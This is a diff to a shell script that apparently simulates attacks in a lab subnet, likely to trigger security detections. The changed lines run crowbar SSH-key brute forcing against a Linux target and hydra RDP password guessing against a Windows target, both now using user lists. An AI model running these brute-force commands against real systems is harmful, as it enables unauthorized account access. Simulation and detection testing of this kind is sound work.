@@ -45,10 +45,7 @@ echo '* keys and credentials (This attempt will not actually succeed in     *'
 echo '* obtaining access to the target linux instance in this subnet)       *'
 echo '***********************************************************************'
 echo
-for j in `seq 1 10`; 
-do
-	sudo ./crowbar/crowbar.py -b sshkey -s $BASIC_LINUX_TARGET/32 -u ec2-user -k ./compromised_keys;
-done
+for j in `seq 1 20`; do sudo ./crowbar/crowbar.py -b sshkey -s $BASIC_LINUX_TARGET/32 -U users -k ./compromised_keys; done
 echo
 echo '-----------------------------------------------------------------------'
 echo
@@ -63,7 +60,7 @@ echo '* windows instance.                                                   *'
 echo '***********************************************************************'
 echo
 echo 'Sending 250 password attempts at the windows server...'
-hydra -t 4 -f -l administrator -P ./passwords/password_list.txt rdp://$BASIC_WINDOWS_TARGET
+hydra  -f -L /home/ec2-user/users -P ./passwords/password_list.txt rdp://$BASIC_WINDOWS_TARGET
 echo
 echo '-----------------------------------------------------------------------'
 echo
